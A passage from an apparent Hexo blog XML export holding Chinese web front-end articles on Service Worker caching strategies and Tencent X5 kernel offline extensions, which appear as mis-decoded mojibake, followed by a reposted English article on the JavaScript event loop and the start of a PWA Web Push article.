åœ¨æ¿€æ´»äº‹ä»¶activateç›‘å¬äº‹ä»¶ä¸­æ¸…é™¤å†å²ç¼“å­˜ï¼Œåœ¨è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯caches.keyséå†çš„æ˜¯å½“å‰åŸŸä¸‹æ‰€æœ‰çš„cacheï¼Œå¯èƒ½åŒåŸŸä¸‹çš„å…¶å®ƒpathä¹Ÿä½¿ç”¨äº†Service Workerè¿›è¡Œèµ„æºç¼“å­˜ï¼Œç›´æ¥å¦‚å›¾æ‰€ä¸ºï¼Œå¯èƒ½ä¼šè¯¯åˆ é™¤ã€‚ åœ¨fetchäº‹ä»¶ä¸­ï¼Œæ‹¦æˆªå‰ç«¯é¡µé¢å‘èµ·çš„èµ„æºè¯·æ±‚å¹¶åˆ°ä¹‹å‰ç¼“å­˜çš„cacheä¸­åŒ¹é…ã€‚å…¶ä¸­åŠ ä¸Šå®¹é”™å¤„ç†ï¼Œå½“å‘ç°ç¼“å­˜ä¸­æ— å½“å‰æ‰€è¦è¯·æ±‚çš„èµ„æºæ—¶ï¼ŒæŠ˜å›ç½‘ç»œè¯·æ±‚ã€‚ 4.2 æ·±å…¥äº†è§£Service Workerèµ„æºçš„å‡ ç§ç¼“å­˜ç­–ç•¥äº†è§£Service Workerèµ„æºçš„å‡ ç§ç¼“å­˜ç­–ç•¥æ˜¯ä½¿ç”¨å¥½Service Workerè¿›è¡Œèµ„æºç¼“å­˜çš„åŸºç¡€ï¼Œå®é™…åº”ç”¨åœºæ™¯ä¼šæ˜¯å‡ ç§ç¼“å­˜ç­–ç•¥çš„é›†åˆã€‚ 4.2.1 ä¸å½±å“å®‰è£…çš„èµ„æºé¢„ç¼“å­˜ å¯¹äºæŸäº›å›ºå®šä¸å˜çš„é™æ€èµ„æºï¼Œæˆ‘ä»¬ä¹ æƒ¯åœ¨Service Workeråˆæ¬¡å®‰è£…çš„installäº‹ä»¶ä¸­å°†å…¶ç¼“å­˜ï¼Œä½†èµ„æºè¿‡å¤§æˆ–è€…ç½‘ç»œä¸ä½³éƒ½ä¼šé€ æˆèµ„æºå¹¶æœªå…¨éƒ¨ä¸‹è½½æˆåŠŸè€Œå¯¼è‡´Service Workerå®‰è£…è¢«ä¸­æ–­ï¼Œåªæœ‰ç­‰ä¸‹æ¬¡ç”¨æˆ·åœ¨æ‰“å¼€ç›¸åº”é¡µé¢ã€‚è¿™é‡Œå¯ä»¥å°†é™æ€èµ„æºæŒ‰ä¼˜å…ˆçº§åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯é‡è¦èµ„æºï¼Œä¸€ç±»æ˜¯éé‡è¦èµ„æºï¼Œå°†é‡è¦èµ„æºæ”¾åˆ°å®‰è£…ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼Œéé‡è¦èµ„æºæ”¾åˆ°ç‹¬ç«‹çš„é˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·åªéœ€è¦é‡è¦èµ„æºå…¨éƒ¨éƒ½åŠ è½½æˆåŠŸå°±å¯ä»¥æˆåŠŸå®‰è£…Service Workeräº†ï¼Œå¯ä»¥æé«˜Service Workerå®‰è£…æˆåŠŸç‡ã€‚ offline-page-not-dependent-on-install 4.2.2 æ¸è¿›å¼ç¼“å­˜ å¯¹äºåœ¨installä¸­å‘ç°æ²¡æœ‰ç¼“å­˜ï¼Œé¡µé¢åˆä¾èµ–ä½†åˆä¸ç»å¸¸å˜åŒ–çš„èµ„æºï¼Œå¯ä»¥åœ¨é¡µé¢æ‰“å¼€æˆ–å‘ç”Ÿç”¨æˆ·äº¤äº’æ—¶è§¦å‘fetchç„¶åä½¿ç”¨fetch apiå†å»ç½‘ç»œæ‹‰å–ï¼Œå°†è¿”å›æ­£å¸¸çš„responseç¼“å­˜èµ·æ¥ä»¥ä¾¿ä¸‹æ¬¡ä½¿ç”¨ã€‚ progressive-cache 4.2.3 ä»…ä½¿ç”¨ç¼“å­˜ åœ¨fetchäº‹ä»¶ä¸­ï¼Œä»…å»åŒ¹é…èµ„æºï¼Œè‹¥åŒ¹é…å¤±è´¥ï¼Œè¡¨ç°å‡ºæ¥çš„å°±æ˜¯å‰ç«¯é¡µé¢å¯¹äºè¯¥ èµ„æºåŠ è½½å¤±è´¥ã€‚è¿™é‡Œå®¹é”™æ€§æ¯”è¾ƒå·®ï¼Œé€‚åˆé¡µé¢èµ„æºéƒ½æ˜¯é™æ€èµ„æºçš„ï¼Œä¸”ä¸èƒ½ä½¿ç”¨ä¸å½±å“å®‰è£…çš„èµ„æºé¢„ç¼“å­˜ã€‚ cache-only 4.2.4 ä»…ä½¿ç”¨ç½‘ç»œ åœ¨fetchäº‹ä»¶ä¸­ï¼Œä»…å°†requesté‡æ–°æŠ½å‡ºç”¨fetchå»ç½‘ç»œåŠ è½½å¹¶è¿”å›ç»™å‰ç«¯é¡µé¢ã€‚é€‚ç”¨äºèµ„æºå¤§å¤šæ˜¯åŠ¨æ€èµ„æºã€å®æ—¶æ€§è¦æ±‚é«˜çš„åœºæ™¯ã€‚ network-only 4.2.5 ç¼“å­˜ä¼˜å…ˆ ç®€å•çš„èµ„æºç¼“å­˜ä¸­ä½¿ç”¨çš„å°±æ˜¯ç¼“å­˜ä¼˜å…ˆç­–ç•¥ï¼Œå…ˆå»ç¼“å­˜åŒ¹é…ï¼ŒåŒ¹é…å¤±è´¥æŠ˜å›ç½‘ç»œï¼Œè¿™ç®—æ˜¯æœ€å¸¸ç”¨ã€å®¹é”™æ€§èƒ½å¥½çš„ä¸€ç§ç­–ç•¥ã€‚ offline-page 4.2.6 ç½‘ç»œä¼˜å…ˆ åœ¨fetchäº‹ä»¶ä¸­å…ˆå»ç½‘ç»œfetchï¼Œå½“å‡ºç°æœåŠ¡å™¨æ•…éšœæˆ–è€…ç½‘ç»œä¸è‰¯æ—¶ï¼ŒæŠ˜å›æœ¬åœ°ç¼“å­˜ï¼Œç›®çš„æ˜¯ä¸ºäº†å±•ç¤ºæœ€æ–°çš„æ•°æ®ï¼Œå¯¹å®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜ä½†åˆèƒ½å¤Ÿå¸¦æ¥è‰¯å¥½ä½“éªŒçš„åº”ç”¨ï¼Œæ¯”å¦‚å¤©æ°”ç±»å‹åº”ç”¨ã€‚ network-first 4.2.7 é€Ÿåº¦ä¼˜å…ˆ åœ¨fetchäº‹ä»¶ä¸­åŒæ—¶å‘èµ·æœ¬åœ°ç¼“å­˜åŒ¹é…åŠç½‘ç»œè¯·æ±‚ï¼Œè°å…ˆè¿”å›ä½¿ç”¨è°çš„ï¼Œè¯¥æ–¹æ¡ˆé€‚ç”¨äºå¯¹æ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜çš„ç«™ç‚¹ï¼Œç¼©çŸ­äº†ç¼“å­˜ä¼˜å…ˆç­–ç•¥ä¸­æœ‰å¯èƒ½ç¼“å­˜ä¸­æ²¡æœ‰èµ„æºå†æŠ˜å›ç½‘ç»œçš„æ—¶é—´æ¶ˆè€—ã€‚ speed-first 4.3 Service Workerè·¨åŸŸèµ„æºçš„ç¼“å­˜ç­–ç•¥Service Workerå¯ä»¥æ‹¦æˆªå®ƒç®¡è¾–èŒƒå›´å†…çš„åŸºæœ¬æ‰€æœ‰è¯·æ±‚ï¼Œè·¨åŸŸèµ„æºä¹Ÿä¸ä¾‹å¤–ã€‚åœ¨æ™®é€šçš„é¡µé¢ä¸­ï¼ŒåŒ…å«å‡ ä¸ªè·¨åŸŸè„šæœ¬ã€å›¾ç‰‡ç­‰èµ„æºä¹Ÿå¤ªæ­£å¸¸äº†ã€‚é‚£ä¹ˆå¦‚ä½•å¯¹è¿™äº›è·¨åŸŸèµ„æºè¿›è¡Œç¼“å­˜å‘¢ï¼Ÿ é¦–å…ˆï¼Œæµè§ˆå™¨é»˜è®¤å¯¹è·¨åŸŸèµ„æºå‘èµ·çš„æ˜¯ncorsè¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯å¾—åˆ°çš„responseæ˜¯opaqueçš„ï¼ŒService Workeræ˜¯æ— æ³•è·å¾—è¯¥responseçš„statusåŠurlä¿¡æ¯ï¼Œä»¥è‡³äºè¯¥responseæ˜¯å¦æˆåŠŸä¸å¾—è€ŒçŸ¥ã€‚å¦‚æœå¯¹è·¨åŸŸèµ„æºèƒ½å¤Ÿå‘èµ·corsè¯·æ±‚ï¼Œåœ¨è·¨åŸŸæœåŠ¡å™¨å…è®¸çš„æƒ…å†µä¸‹ï¼Œå¾—åˆ°éƒ¨åˆ†å±æ€§statusåŠurlå¯è§çš„responseï¼Œå°±å¯ä»¥åˆ¤æ–­å‡ºè·¨åŸŸè¯·æ±‚æ˜¯å¦æˆåŠŸï¼Œæ˜¯å¦å¯ä»¥è¿›è¡Œç¼“å­˜ä»¥å¤‡ä¸‹æ¬¡ä½¿ç”¨äº†ã€‚æœç€è¿™ä¸ªæ€æƒ³ï¼š é¦–å…ˆä¿è¯è·¨åŸŸçš„èµ„æºæ¥è‡ªå®‰å…¨çš„httpsåœ°å€ï¼› ä¿è¯è·¨åŸŸèµ„æºæœåŠ¡å™¨çš„responseä¸­Access-Control-Allow-Originä¸­åŒ…å«å½“å‰çš„é¡µé¢æ‰€åœ¨åŸŸæˆ–è€…ä¸º *ï¼› å¯¹äºå‰ç«¯é¡µé¢ä¸­çš„è·¨åŸŸèµ„æºçš„urlå¯ä»¥é™„å¸¦â€œcors=1â€å‚æ•°ï¼Œä»¥ä¾¿Service Workeråœ¨æ‹¦æˆªä¹‹åå¯ä»¥åˆ¤æ–­å‡ºæ˜¯è·¨åŸŸè¯·æ±‚ä»è€Œé‡æ–°è¿›è¡Œç»„è£…corsè¯·æ±‚ï¼Œå¦‚å›¾17ã€‚ cross-resources 5 X5å†…æ ¸Service WorkeråŠŸèƒ½æ‰©å±•5.1 é¦–æ¬¡è®¿é—®è§£å†³æ–¹æ¡ˆæ–¹æ¡ˆé¦–æ¬¡è®¿é—®è§£å†³æ–¹æ¡ˆæ—¨åœ¨ç”¨æˆ·è®¿é—®ä¸šåŠ¡å‰å®ç°ä¸šåŠ¡çš„èµ„æºç¼“å­˜ï¼Œè®©ç”¨æˆ·åœ¨ç¬¬ä¸€æ¬¡çœŸæ­£è®¿é—®ä¸šåŠ¡æ—¶èƒ½å¤Ÿè®©ä¸šåŠ¡é¡µé¢ä»¥æœ€å¿«çš„é€Ÿåº¦å±•ç¤ºå‡ºæ¥ã€‚é’ˆå¯¹è¯¥ä¸»æ—¨ï¼ŒX5å†…æ ¸å®ç°äº†ä¸‰å¥—å…·ä½“å®ç°æ–¹æ¡ˆï¼š 5.1.1 ç¦»çº¿åŒ…æ–¹å¼ ç¦»çº¿åŒ…åŸç†å°±æ˜¯å…ˆåœ¨X5å†…æ ¸ä¸Šæ¨¡æ‹Ÿæ‰“å¼€ä¸€æ¬¡ä¸šåŠ¡ç½‘å€ï¼Œç„¶åå°†Service Workerä¸­çš„cachestorageç¼“å­˜ã€æ³¨å†Œä¿¡æ¯åŠè„šæœ¬ä¿¡æ¯æ•°æ®åº“è¿›è¡Œæ‰“åŒ…å†…ç½®åˆ°å®¿ä¸»ä¸­ï¼Œå½“å®¿ä¸»é¦–æ¬¡å®‰è£…æ—¶å°†ç¦»çº¿åŒ…è·¯å¾„å‘ŠçŸ¥å†…æ ¸ï¼Œå†…æ ¸ä¼šè‡ªåŠ¨å°†ç¦»çº¿åŒ…æ‹·è´è§£å‹åˆ°å†…æ ¸ç›®å½•ã€‚ç›¸å½“äºç”¨æˆ·è·³è¿‡äº†é¦–æ¬¡è®¿é—®å®‰è£…Service Workerçš„è¿‡ç¨‹ã€‚ä»¥QQæµè§ˆå™¨ä¸ºä¾‹ï¼š ä¸šåŠ¡ä¾§ï¼š 1ã€å‰ç«¯ä¸šåŠ¡éœ€è¦å»ºç«‹åŸºäºService Workerä¸šåŠ¡ï¼Œå¹¶ä¸”ä¸šåŠ¡å¯ä»¥é€šè¿‡SWå®ç°ç¦»çº¿è®¿é—®ï¼Œåœ¨SWè„šæœ¬çš„installæ–¹æ³•ä¸­éœ€è¦åšèµ„æºçš„ç¼“å­˜ã€‚ 2ã€å¯ä»¥é€šè¿‡QB6.8åŠä»¥ä¸Šç‰ˆæœ¬è®¿é—®swtool.qq.comï¼Œç‚¹å‡»â€œç¦»çº¿åŒ…ç”Ÿæˆç¯å¢ƒåˆå§‹åŒ–â€åé‡å¯æµè§ˆå™¨ï¼Œè¾“å…¥ä¸šåŠ¡ç½‘å€ç›´åˆ°æç¤ºç¦»çº¿åŒ…å·²ç”Ÿæˆåé€€å‡ºæµè§ˆå™¨ï¼Œè¿™æ—¶ç¦»çº¿åŒ…å·²ç”Ÿæˆåœ¨/sdcard/tbs/com.tencent.mtt/out/Service Worker.zipã€‚ 3ã€å…³é—­ç½‘ç»œè¿›å…¥QQæµè§ˆå™¨ï¼Œé€šè¿‡è®¾ç½®æ¸…é™¤ç¼“å­˜æ–‡ä»¶åå†å°†ç”Ÿæˆçš„ç¦»çº¿åŒ…æ‹·è´è‡³/sdcard/tbs/com.tencent.mtt/Service Worker.zipä½ç½®å¹¶é‡æ–°å¯åŠ¨æµè§ˆå™¨è®¿é—®ä¸šåŠ¡ç½‘å€ï¼Œå¦‚æœä¸šåŠ¡å¯ä»¥æ­£å¸¸æ‰“å¼€ï¼Œè¯´æ˜ç¦»çº¿åŒ…OKã€‚ 4ã€è‹¥ä¸šåŠ¡éœ€è¦å°†ç¦»çº¿åŒ…æ‰“è¿›å®¿ä¸»apkï¼Œåªè¦å°†ç¦»çº¿åŒ…ä¸¢ç»™å®¿ä¸»å³å¯ã€‚ X5å†…æ ¸å®¿ä¸»ä¾§ï¼š 1ã€è‹¥TBSå®¿ä¸»åªæœ‰å•ä¸ªä¸šåŠ¡ç¦»çº¿åŒ…æ‰“è¿›apkï¼Œé‚£ä¹ˆå®¿ä¸»éœ€è¦åœ¨å®¿ä¸»apké¦–æ¬¡å®‰è£…å¹¶ä¸”åœ¨TBSå†…æ ¸åˆå§‹åŒ–ä¹‹å‰å°†ä¸šåŠ¡ç¦»çº¿åŒ…æ‹·è´è‡³/sdcard/tbs/{å®¿ä¸»åŒ…å}/Service Worker.zipå³å¯ï¼ŒTBSå¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æœç´¢è¯¥è·¯å¾„ã€‚ 2ã€è‹¥TBSå®¿ä¸»æœ‰å¤šä¸ªå•ä¸šåŠ¡çš„ç¦»çº¿åŒ…éœ€è¦æ‰“è¿›apkï¼Œå¯ä»¥ç”±X5å†…æ ¸ä¾§ååŠ©å®Œæˆåˆå¹¶(åç»­ä¼šæœ‰è‡ªåŠ¨åŒ–åˆå¹¶ç«™ç‚¹å·¥å…·)ï¼Œå°†å¤šä¸ªå•ä¸šåŠ¡ç¦»çº¿åŒ…åˆå¹¶æˆä¸€ä¸ªåå†æŒ‰ç…§å•ä¸šåŠ¡çš„æ–¹å¼å¤„ç†ã€‚ 3ã€TBSå®¿ä¸»åœ¨å‘å¸ƒå‰éœ€è¦å‚è€ƒä¸šåŠ¡ä½¿ç”¨QBè‡ªæ£€çš„æ–¹å¼è‡ªæ£€ä¸šåŠ¡æ˜¯å¦å¯ä»¥ç¦»çº¿æ‰“å¼€ã€‚ 5.1.2 X5å†…æ ¸åå°äº‘ä¸‹å‘æŒ‡ä»¤ 1ã€å‰ç«¯ä¸šåŠ¡éœ€è¦å»ºç«‹åŸºäºService Workerä¸šåŠ¡ï¼Œå¹¶ä¸”ä¸šåŠ¡å¯ä»¥é€šè¿‡SWå®ç°ç¦»çº¿è®¿é—®ï¼Œåœ¨SWè„šæœ¬çš„installæ–¹æ³•ä¸­éœ€è¦åšèµ„æºçš„ç¼“å­˜ 2ã€éœ€è¦å°†æå‰é¢„ç½®çš„ä¸šåŠ¡ç½‘å€åŠService Workerè„šæœ¬urlåŠå®¿ä¸»åŒ…ååŒæ­¥ç»™X5å†…æ ¸å›¢é˜Ÿ(ç›®å‰æ¥å£è´Ÿè´£äººzhengyuliã€yongling)ï¼Œå®¡æ ¸é€šè¿‡åéšæ—¶å¯ä»¥ä¸Šçº¿ã€‚ 5.1.3 X5å†…æ ¸æ‰©å±•æ¥å£ ä½¿ç”¨TBSçš„å®¿ä¸»å¯ä»¥è°ƒç”¨X5å†…æ ¸æ‰©å±•æ¥å£webview.getX5WebViewExtension().registerServiceWorkerBackground(String url, String scriptUrl)æ¥æå‰å‘å†…æ ¸æ³¨å†ŒæŸä¸€ç‰¹å®šé¡µé¢çš„Service Workerã€‚ 5.2 ä¸¤ç§é™é»˜æ›´æ–°æ–¹æ¡ˆå¯¹äºä¸€äº›æ›´æ–°æ¯”è¾ƒé¢‘ç¹ï¼Œå®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„ä¸šåŠ¡ï¼Œå¯¹æ›´æ–°èƒ½åŠ›éœ€æ±‚ä¹Ÿæ˜¯ç›¸å½“äºŸéœ€ã€‚ä¸€æ–¹é¢èƒ½è®©ç”¨æˆ·èƒ½å¤ŸåŠæ—¶çœ‹åˆ°æœ€æ–°æ¶ˆæ¯ï¼ˆService Workerç›®å‰è‡ªå¸¦çš„æ›´æ–°èƒ½åŠ›åªä¼šå‘ç”Ÿåœ¨å½“å‰è®¿é—®åï¼Œåªæœ‰ä¸‹æ¬¡æ‰èƒ½çœ‹åˆ°æ–°æ›´æ–°çš„é¡µé¢ï¼‰ï¼Œå¦ä¸€æ–¹é¢èƒ½å¤Ÿç¼“è§£å¯¹ä¸šåŠ¡æœåŠ¡å™¨çš„å¹¶å‘è®¿é—®ï¼Œè¿˜èƒ½å¤Ÿç¼“è§£ç”¨æˆ·çš„ç½‘ç»œæ…¢å¯¼è‡´è¿›è¡Œä¸šåŠ¡æ›´æ–°æ—¶é•¿æ—¶é—´ç­‰å¾…ã€‚å…·ä½“å®ç°æ¡†æ¶è§å›¾17ã€‚ 5.2.1 TBSåå°äº‘ä¸‹å‘æŒ‡ä»¤ 1ã€å‰ç«¯ä¸šåŠ¡éœ€è¦éªŒè¯ä¸šåŠ¡åœ¨æ›´æ–°Service Workerè„šæœ¬åæ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—® 2ã€éœ€è¦å°†æå‰é¢„ç½®çš„ä¸šåŠ¡ç½‘å€åŠService Workerè„šæœ¬urlåŠå®¿ä¸»åŒ…åå’Œæ›´æ–°æ—¶é—´é—´éš”åŒæ­¥ç»™X5å†…æ ¸å›¢é˜Ÿ(ç›®å‰æ¥å£è´Ÿè´£äººzhengyuliã€yongling)ï¼Œå®¡æ ¸é€šè¿‡åéšæ—¶å¯ä»¥ä¸Šçº¿ã€‚ 5.2.2 TBS webviewæ‰©å±•æ¥å£ ä½¿ç”¨TBSçš„å®¿ä¸»å¯ä»¥è°ƒç”¨X5å†…æ ¸æ‰©å±•æ¥å£webview.getX5WebViewExtension().updateServiceWorkerBackground(String url)æ¥æå‰å‘å†…æ ¸ç”³è¯·æ›´æ–°ç‰¹å®šä¸šåŠ¡çš„Service Worker(æ³¨æ„è¿™é‡Œéœ€è¦ä¸šåŠ¡å·²ç»åœ¨å†…æ ¸ä¸­å®‰è£…è¿‡Service Workerï¼Œåˆ‡æ­¤æ¥å£è°ƒç”¨ä¸€æ¬¡åªä¼šå¼ºåˆ¶æ›´æ–°ä¸€æ¬¡)ã€‚ 6 X5å†…æ ¸åŸºäºService Workerç¦»çº¿åœºæ™¯åŠ è½½ä¼˜åŒ–é€šå¸¸appåœ¨ä½¿ç”¨webviewæ—¶ï¼Œä¸ºäº†æå‡å±•ç¤ºé¡µé¢çš„é€Ÿåº¦ï¼Œä¸€èˆ¬éƒ½ä¼šä½¿ç”¨webviewçš„shouldInterceptRequestæ¥æ‹¦æˆªwebviewçš„èµ„æºè¯·æ±‚ï¼Œç„¶åå°†æœ¬åœ°çš„èµ„æºæ ¡éªŒåä¸¢ç»™webviewå¤„ç†ã€‚å› ä¸ºshouldInterceptRequestä»å†…æ ¸é€šçŸ¥åˆ°appï¼Œéœ€è¦ç»Ÿä¸€åœ¨Fileçº¿ç¨‹ä¸­æ’é˜Ÿå¹¶ç»å†å¥½å‡ ä¸ªçº¿ç¨‹çš„ä¸­è½¬åˆ°è¾¾appï¼Œå¯¹äºèµ„æºå¹¶å‘è¯·æ±‚è¾ƒå°‘çš„é¡µé¢æ¥è¯´ï¼Œè¿™ç§ç“¶é¢ˆå¯èƒ½å¹¶ä¸æ˜æ˜¾ï¼Œå¯¹äºé¡µé¢è¾ƒå¤æ‚å¹¶å‘è¯·æ±‚è¾ƒå¤šçš„é¡µé¢æ¥è¯´ï¼Œé¦–å±åŠ è½½å®Œæˆçš„æ—¶é—´å¹¶ä¸èƒ½åƒæ‰“å¼€æœ¬åœ°é¡µé¢é‚£æ ·â€œç§’å¼€â€ã€‚ X5å†…æ ¸å€Ÿé‰´Service WorkeråŸç†ï¼Œå…è®¸appæå‰å°†ä¸šåŠ¡çš„èµ„æºæ”¾å…¥åˆ°å†…æ ¸ç¼“å­˜ï¼Œå½“ä¸šåŠ¡è¢«è®¿é—®æ—¶ï¼Œä¼šå…ˆè®¿é—®æœ¬åœ°cacheï¼Œæœ‰å°±ç›´æ¥è¿”å›ç»™å†…æ ¸ï¼Œæ²¡æœ‰å°±è·³è¿‡shouldInterceptRequestç›´æ¥å»ç½‘ç»œåŠ è½½ï¼Œæ¥å±è”½shouldInterceptRequestæ€§èƒ½ç“¶é¢ˆã€‚åœ¨æ‰‹æœºQQä¸Šçš„ä¸ªåˆ«ä¸šåŠ¡ä¸Šæœ‰é¦–å±æ€§èƒ½æœ‰25%å·¦å³çš„æå‡ã€‚ ä½¿ç”¨TBSçš„å®¿ä¸»åœ¨ç©ºé—²æ—¶é—´ï¼ˆä¸è¦åœ¨æ‰“å¼€ä¸šåŠ¡çš„æ—¶å€™ï¼Œè½¬å…¥å†…æ ¸ç¼“å­˜éœ€è¦æ¶ˆè€—èµ„æºï¼‰å¯ä»¥è°ƒç”¨X5å†…æ ¸æ‰©å±•æ¥å£ webview.getX5WebViewExtension().registerServiceWorkerOffline(String url, List paths, boolean deleteAllCacheBefore) å…¶ä¸­urlä¸ºä¸šåŠ¡ç½‘å€ï¼Œpathsä¸ºç»å¯¹ç¼“å­˜è·¯å¾„ï¼Œå¦‚ https://host.com/path1/path2/img.png éœ€è¦å»ºç«‹//cache/host.com/path1/path2/img.png è¿™æ ·çš„è·¯å¾„ï¼Œå¹¶å°†//cacheä¼ å…¥å†…æ ¸ï¼Œå› ä¸ºæ˜¯listï¼Œæ‰€ä»¥æ”¯æŒå¤šä¸ªç›®å½•ï¼Œæ¯”å¦‚//cache1ã€//cache2ç­‰ã€‚deleteAllCacheBefore åˆ é™¤è¯¥ä¸šåŠ¡ä¹‹å‰ä¹Ÿæœ‰ç¼“å­˜ï¼Œå› ä¸ºåœ¨æ›´æ–°èµ„æºæ—¶ä¹Ÿæ˜¯è°ƒç”¨åŒæ ·çš„æ¥å£ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå‡ºç°å†…æ ¸ç¼“å­˜çš„å†—ä½™ã€‚ å¦å¤–å¯ä»¥è°ƒç”¨webview.getX5WebViewExtension().clearServiceWorkerCache()[å°†ä¼šåœ¨TBS3.3ä¸Šæä¾›]æ¥æ¸…é™¤è½¬å…¥å†…æ ¸çš„ç¼“å­˜ï¼ŒåŒ…æ‹¬æ³¨å†Œä¿¡æ¯ï¼Œä»¥ä¾¿èƒ½å¤ŸåŠ¨æ€çš„æ¢å¤åˆ°ä¹‹å‰çš„çŠ¶æ€ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Understanding JavaScript â€” Heap, Stack, Event-loops and Callback Queue]]></title>
    <url>%2F2019%2F11%2F24%2FWeb%E5%89%8D%E7%AB%AF%2FUnderstanding%20JavaScript%20%E2%80%94%20Heap%2C%20Stack%2C%20Event-loops%20and%20Callback%20Queue%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ª https://medium.com/ï¼Œä½œè€… Murat Catalï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://medium.com/javascript-in-plain-english/understanding-javascript-heap-stack-event-loops-and-callback-queue-6fdec3cfe32e JavaScript is a single thread language which makes it different from most of the languages. It is lack of multi-thread applicationâ€™s abilities whereas it does not have to deal with complex problems such as deadlock or shared variable problems. Single thread?A single thread language will be lack of having concurrent processes running at the same time. That means, if you have a process which takes long time, then it will block other processes to run. For that reason, there is a timeout defined in browsers which waits for response of process. When the process does not response in that timeout, you will see a popup which asks you to kill process or not. Do not run any business that will take long time on browser for not to block other functions. So, How JavaScript simulate like itâ€™s running our commands in a multi-thread environment? To answer this question letâ€™s deep into how JavaScript environment. JavaScript environment Although JavaScript is a single thread language, we have a strong helper which is browser that has ability to manage complex operations. Web API, Callback Queue and Event Loop mechanisms are part of browsers. Letâ€™s dig into some details of each part. HeapHeap is the place (memory) where objects are stored when we define variables. StackStacks holds our function calls. On each new function call, itâ€™s pushed on top of the stack. You can see your stack when you have an exception on JavaScript by stack trace. Web APIBrowsers have defined APIâ€™s which developers can be used to make complex processes such as to get location of visitor, GeoLocation is defined. A list of APIs are defined in the link which you can find in references (1). Callback QueueWhen a process finished its job, such as a xhr call, itâ€™s dropped in a callback queue. Callback queue is triggered by event loop process after our stack is empty which means the process waits in that queue until our stack is empty. Once our stack has no function call, then a process is popped-out from callback queue and pushed in to stack. Event Loop A process which is responsible to check our stack and then trigger our callback queue continuously. Example Whatâ€™s the expected output of above example? It starts with a console.log then continue with a setTimeout function which we wanted to run immediately(?) by giving a â€œ0â€ timeout then another console.log. setTimeout is something special. Itâ€™s not defined in ECMAScript specification. It is a Web API (2). It works asynchronously. The given timeout does not guarantee that function will work after the given time but guarantees that it will wait at least given time. So setTimeout(fn,0) will not start immediately but it will wait at least zero millisecond. Letâ€™s explain how it will behave when we run above code snippet. our first console.log(â€œMuratâ€) will be pushed to stack because we are making a function call. The variable will be saved in heap (memory) Because itâ€™s not a async call, itâ€™ll output given parameter First console.log function will be removed from stack, and heap will be empty setTimeout function will be called. So itâ€™ll be pushed to stack Itâ€™s a async function and is a Web API function. Itâ€™ll be pushed to Web API box and setTimeout function will be removed from stack A timer in the background will be started to wait at least given amount of time to setTimeout. console.log(â€œYusufâ€) will be called and itâ€™ll be pushed to stack and Yusuf will be stored in heap. It will output Yusuf. But at the same time, our event loop will continue checking stackâ€™s status. After output of Yusuf, itâ€™ll be removed from stack and heap. When the timer be sured that itâ€™s waited at least given time, itâ€™ll be pushed to callback queue (console.log(â€œFatihâ€)) Our event loop will trigger callback queue when the stack gets empty. Next, console.log(â€œFatihâ€) will be put to stack So, our output will be in the order of â€œMuratâ€, â€œYusufâ€, â€œFatihâ€ References Web API list, https://developer.mozilla.org/en-US/docs/Web/API setTimeout specification, https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWAï¼šPush]]></title>
    <url>%2F2019%2F11%2F19%2FWeb%E5%89%8D%E7%AB%AF%2FPWA%EF%BC%9APush%2F</url>
    <content type="text"><![CDATA[ä»€ä¹ˆæ˜¯ Web Pushç›®å‰å¤§éƒ¨åˆ†æµè§ˆå™¨å·²ç»æ”¯æŒ Notification APIï¼Œä½† Web Notification è¦æ±‚ç”¨æˆ·å¿…é¡»åœ¨çº¿æ‰“å¼€ Web Pageã€‚é‚£ä¹ˆå¦‚ä½•åœ¨ç½‘é¡µå…³é—­æƒ…å†µä¸‹ç»§ç»­å‘é€ Web Notification å‘¢ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯æˆ‘ä»¬ä»Šå¤©è¦ä»‹ç»çš„åŸºäº Service Worker å’Œ Push API çš„ Web Push æŠ€æœ¯ã€‚ å®ç°ç»†èŠ‚ ç”¨æˆ·æˆæƒï¼šå‘ç”¨æˆ·è¯·æ±‚ç”¨äºæ¥æ”¶æ¶ˆæ¯æ¨é€çš„æƒé™ã€‚ æ³¨å†Œ Service Workerï¼šé¡µé¢å‘æµè§ˆå™¨æ³¨å†Œä¸€ä¸ªServiceWorkerï¼Œæµè§ˆå™¨ç”Ÿæˆå¯¹åº” ServiceWorkerRegistrationå¯¹è±¡ã€‚ è®¢é˜…æ¶ˆæ¯ï¼šé¡µé¢é€šè¿‡ ServiceWorker çš„ PushManager.subscribe æ–¹æ³•å‘ push serviceï¼ˆFCMï¼‰è®¢é˜…æ¶ˆæ¯ï¼ŒFCM è¿”å› push subscription ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ‰¾åˆ°å¯¹åº”çš„ ServiceWorkerï¼Œå¹¶æŠŠ push subscription å›ä¼ ç»™ServiceWorkerã€‚ åœ¨è®¢é˜…ä¸€ä¸ªç”¨æˆ·ä¹‹å‰ï¼Œéœ€è¦é‡‡ç”¨ VAPID åè®®ç”Ÿæˆä¸€å¥—åº”ç”¨æœåŠ¡å™¨å¯†é’¥ï¼Œä¹Ÿè¢«ç§°ä¸º VAPID å¯†é’¥ï¼Œå¯¹äºæ¯ä¸ªè¯·æ±‚ Push Service çš„ Web åº”ç”¨æœåŠ¡å™¨æ¥è¯´æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼ŒPush Service æ ¹æ® VAPID æ¥å®šä½å“ªä¸ª Web 